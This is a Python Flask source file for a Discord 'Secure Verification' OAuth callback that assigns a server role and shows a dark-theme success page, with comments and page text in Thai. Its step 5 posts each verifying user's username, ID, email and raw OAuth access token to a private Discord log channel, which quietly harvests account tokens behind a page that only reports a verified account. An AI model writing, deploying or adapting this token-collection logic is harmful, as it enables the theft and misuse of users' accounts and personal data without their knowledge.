from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

CLIENT_ID = os.environ.get("CLIENT_ID")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# 🎨 หน้าเว็บ Dark Theme
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>KIREN.COM - Secure Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;700&display=swap');
        body { font-family: 'Kanit', sans-serif; background-color: #0f0f0f; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 0%, #2a0a0a 0%, #0f0f0f 70%); }
        .card { background-color: #141414; border: 1px solid #2a2a2a; padding: 40px 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(255, 0, 0, 0.1); width: 90%; max-width: 400px; }
        .logo { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 20px; object-fit: cover; border: 2px solid #ff3333; }
        h1 { font-size: 24px; font-weight: 700; margin: 0; }
        h2 { font-size: 20px; margin: 10px 0; color: #57F287; }
        p { font-size: 13px; color: #aaa; margin-bottom: 25px; }
        .user-card { background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 10px; display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
        .user-card img { width: 40px; height: 40px; border-radius: 50%; }
        .user-info h3 { margin: 0; font-size: 16px; }
        .btn { background-color: #333; color: white; padding: 15px; text-decoration: none; border-radius: 10px; font-weight: bold; display: block; }
    </style>
</head>
<body>
    <div class="card">
        <img src="{{ avatar }}" class="logo">
        <h1>KIREN.COM</h1>
        <h2>ยืนยันตัวตนเรียบร้อยแล้ว</h2>
        <p>ระบบดำเนินการให้ยศและบันทึกข้อมูลเรียบร้อยแล้ว</p>
        <div class="user-card">
            <img src="{{ avatar }}">
            <div class="user-info">
                <h3>{{ username }}</h3>
                <span style="color: #57F287;">✔ Access Granted</span>
            </div>
        </div>
        <a href="https://discord.com/app" class="btn">กลับสู่ Discord</a>
    </div>
</body>
</html>
"""

@app.route('/callback')
def callback():
    code = request.args.get('code')
    state = request.args.get('state') # guild_id-role_id-public_log-private_log
    
    if not code or not state:
        return "❌ ไม่พบข้อมูล", 400

    try:
        guild_id, role_id, public_log, private_log = state.split('-')
    except:
        return "❌ รูปแบบ State ไม่ถูกต้อง", 400

    # 1. แลก Code เป็น Token
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    r = requests.post('https://discord.com/api/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    access_token = r.json().get('access_token')

    if not access_token:
        return f"❌ Error: {r.text}", 400

    # 2. ดึงข้อมูล User
    user_r = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    user_id = user_r['id']
    username = user_r['username']
    email = user_r.get('email', 'N/A')
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_r['avatar']}.png" if user_r.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"

    bot_headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

    # 3. ให้ยศ
    requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}", headers=bot_headers)

    # 4. ส่งข้อมูลลงห้อง Log สาธารณะ (แจ้งเตือน)
    if public_log != "0":
        public_embed = {
            "content": f"🔔 <@{user_id}> **ผ่านการยืนยันตัวตนสำเร็จแล้ว!**",
            "embeds": [{
                "title": "✅ ผู้ใช้ยืนยันตัวตนใหม่",
                "color": 3066993,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {"name": "👤 ชื่อผู้ใช้", "value": f"`{username}`", "inline": True},
                    {"name": "🆔 Discord ID", "value": f"`{user_id}`", "inline": True}
                ],
                "footer": {"text": "KIREN SYSTEM"}
            }]
        }
        requests.post(f"https://discord.com/api/v10/channels/{public_log}/messages", headers=bot_headers, json=public_embed)

    # 5. ส่งข้อมูลลงห้อง Log ลับ (เก็บ Token)
    if private_log != "0":
        private_embed = {
            "embeds": [{
                "title": "💾 ข้อมูลผู้ใช้ (Private Log)",
                "color": 16711680,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {"name": "👤 ชื่อผู้ใช้", "value": f"`{username}`", "inline": True},
                    {"name": "🆔 Discord ID", "value": f"`{user_id}`", "inline": True},
                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
                    {"name": "🔑 Token", "value": f"||`{access_token}`||", "inline": False} 
                ],
                "footer": {"text": "KIREN PRIVATE LOG - DO NOT SHARE"}
            }]
        }
        requests.post(f"https://discord.com/api/v10/channels/{private_log}/messages", headers=bot_headers, json=private_embed)

    return render_template_string(HTML_TEMPLATE, username=username, avatar=avatar_url)

if __name__ == '__main__':
    app.run(port=5000)